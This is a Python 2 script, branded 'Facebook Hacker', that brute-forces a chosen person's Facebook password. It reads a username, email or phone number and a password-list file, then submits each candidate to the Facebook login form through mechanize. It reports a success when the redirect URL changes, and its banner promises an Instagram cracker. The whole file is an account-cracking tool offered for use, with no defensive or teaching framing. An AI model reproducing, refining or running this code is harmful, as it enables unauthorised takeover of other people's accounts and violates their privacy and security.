#!/usr/bin/env python
#coding utf-8
import mechanize
import random
import sys
import string
from time import sleep
from getpass import getpass
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan  
def secr():
	print ""+R+" "
	print """
	[+] ============= [+]
	[+] secret option [+]
	[+] ============= [+]
	"""
	

def facebook():
	print ""+G+" "
	print """
	[+]===================================
	[+]Author: Andrew-Firestorm-Hacker-El
	[+]===================================
	[=]Facebook Hacker--------------------
	[+]*Version 1* Requires name and psslist
	[+]===================================
	[+]-----------Use with Caution--------
	[+]Instagram-password-cracker coming soon...
	[+]===================================
	
"""
	url = "https://www.facebook.com/login.php"
	username = str(raw_input(color.UNDERLINE + ":Please type in username| email| or phone|: " + color.END))

	password = raw_input(color.UNDERLINE + ""+T+" " "Path to Password list(Example /root/Desktop/psslist.txt):" + color.END)

	try:
		password = open(password, "r")
	except:
		print "\nPasswordfile does not exist!"
		quit()
	
	
	for pell in password:
		try:
			f = mechanize.Browser()
			f.set_handle_robots(False)
			f.addheaders = [('User-Agent','Firefox')]
			response = f.open("https://www.facebook.com/login.php")
			f.select_form(nr=0)
			f.form['email'] = username
			f.form['pass'] = pell.strip()
			f.method = "POST"
			response = f.submit()
			print ""+T+" "
			if response.geturl() == "https://www.facebook.com/":
				print "Password succesfull! | " + pell.strip()
				print response.geturl()
				break
			elif response.geturl() == "https://www.facebook.com/?sk=welcome":
			#elif response.geturl() == "whatever happens after you login":
				print "Password succesfull! | " + pell.strip()
				print response.geturl()
				break

			else: 
				print response.geturl(), pell
		except:
			print "error"
			
facebook()	
